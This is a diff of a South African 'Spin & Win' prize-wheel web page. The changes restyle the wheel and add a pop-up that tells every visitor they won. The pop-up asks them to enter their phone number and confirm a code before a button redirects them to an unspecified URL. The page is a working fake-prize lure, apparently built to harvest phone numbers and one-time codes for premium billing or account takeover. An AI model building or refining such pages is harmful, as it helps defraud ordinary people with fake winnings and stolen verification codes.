@@ -12,28 +12,29 @@
       padding: 0;
       text-align: center;
     }
+
     h1 {
       color: #2c3e50;
-      margin-top: 30px;
-      font-size: 22px;
-      padding: 0 10px;
+      margin-top: 20px;
+      font-size: 24px;
     }
+
     #wheelContainer {
       position: relative;
-      margin: 20px auto;
-      width: 95vw;
-      max-width: 400px;
-      height: 95vw;
-      max-height: 400px;
+      margin: 30px auto;
+      width: 320px;
+      height: 320px;
     }
+
     #wheel {
       width: 100%;
       height: 100%;
       border-radius: 50%;
-      border: 10px solid #27ae60;
+      border: 8px solid #27ae60;
       box-shadow: 0 0 15px rgba(0,0,0,0.2);
       transition: transform 5s ease-out;
     }
+
     #pointer {
       width: 0;
       height: 0;
@@ -45,6 +46,7 @@
       left: 50%;
       transform: translateX(-50%);
     }
+
     #spinBtn {
       padding: 15px 30px;
       font-size: 18px;
@@ -53,31 +55,90 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      margin-top: 15px;
+      margin-top: 20px;
     }
+
     #spinBtn:hover {
       background-color: #1c669d;
     }
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-      font-weight: bold;
+
+    #overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    #modal {
+      background: #fff;
+      padding: 25px;
+      max-width: 90%;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+
+    #modal h2 {
       color: #27ae60;
-      padding: 0 15px;
+      margin-bottom: 15px;
+    }
+
+    #modal p {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+
+    #claimBtn {
+      padding: 12px 25px;
+      background-color: #e67e22;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    #claimBtn:hover {
+      background-color: #d35400;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 20px;
+      }
+      #modal h2 {
+        font-size: 20px;
+      }
+      #modal p {
+        font-size: 15px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <h1>🎉 Spin & Win Amazing Prizes in South Africa!</h1>
+  <h1>🎉 Spin & Win in South Africa!</h1>
 
   <div id="wheelContainer">
     <div id="pointer"></div>
-    <canvas id="wheel"></canvas>
+    <canvas id="wheel" width="320" height="320"></canvas>
   </div>
 
   <button id="spinBtn">Spin Now 🔄</button>
-  <div id="result"></div>
+
+  <div id="overlay">
+    <div id="modal">
+      <h2>🎁 You won a prize!</h2>
+      <p>To claim your reward, please enter your phone number and confirm the code sent to you on the next page.</p>
+      <button id="claimBtn">Claim Prize</button>
+    </div>
+  </div>
 
   <audio id="spinSound">
     <source src="https://cdn.pixabay.com/download/audio/2023/01/03/audio_8e604dcab5.mp3?filename=spin-wheel-113441.mp3" type="audio/mp3">
@@ -85,12 +146,11 @@
 
   <script>
     const canvas = document.getElementById("wheel");
-    canvas.width = canvas.clientWidth;
-    canvas.height = canvas.clientHeight;
     const ctx = canvas.getContext("2d");
     const spinBtn = document.getElementById("spinBtn");
-    const resultTxt = document.getElementById("result");
     const spinSound = document.getElementById("spinSound");
+    const overlay = document.getElementById("overlay");
+    const claimBtn = document.getElementById("claimBtn");
 
     const prizes = [
       "R1000 Cheque",
@@ -112,17 +172,17 @@
 
         ctx.beginPath();
         ctx.fillStyle = colors[i];
-        ctx.moveTo(canvas.width/2, canvas.height/2);
-        ctx.arc(canvas.width/2, canvas.height/2, canvas.width/2, start, end);
+        ctx.moveTo(160, 160);
+        ctx.arc(160, 160, 160, start, end);
         ctx.fill();
 
         ctx.save();
-        ctx.translate(canvas.width/2, canvas.height/2);
+        ctx.translate(160, 160);
         ctx.rotate(start + arc / 2);
         ctx.textAlign = "center";
         ctx.fillStyle = "#ffffff";
-        ctx.font = "bold 16px Arial";
-        ctx.fillText(prizes[i], canvas.width/3, 10);
+        ctx.font = "bold 14px Arial";
+        ctx.fillText(prizes[i], 100, 10);
         ctx.restore();
       }
     }
@@ -131,12 +191,11 @@
 
     spinBtn.addEventListener("click", () => {
       spinBtn.disabled = true;
-      resultTxt.innerText = "⏳ Spinning the wheel...";
       spinSound.currentTime = 0;
       spinSound.play();
 
       const randomSpin = Math.floor(Math.random() * prizes.length);
-      const spins = 5;
+      const spins = 6;
       const degreesPerSegment = 360 / prizes.length;
       const finalAngle = (spins * 360) + (randomSpin * degreesPerSegment) + (degreesPerSegment / 2);
 
@@ -144,16 +203,13 @@
       canvas.style.transform = `rotate(${finalAngle}deg)`;
 
       setTimeout(() => {
-        resultTxt.innerHTML = `
-          🎉 You won: <strong>${prizes[randomSpin]}</strong>!<br><br>
-          📝 <strong>To claim your prize:</strong><br>
-          1️⃣ Enter your phone number on the next page<br>
-          2️⃣ Confirm the code you receive<br>
-          3️⃣ Complete the required steps to unlock your reward ✅
-        `;
-        setTimeout(() => window.location.href = redirectURL, 4000);
+        overlay.style.display = "flex";
       }, 5200);
     });
+
+    claimBtn.onclick = () => {
+      window.location.href = redirectURL;
+    };
   </script>
 
 </body>
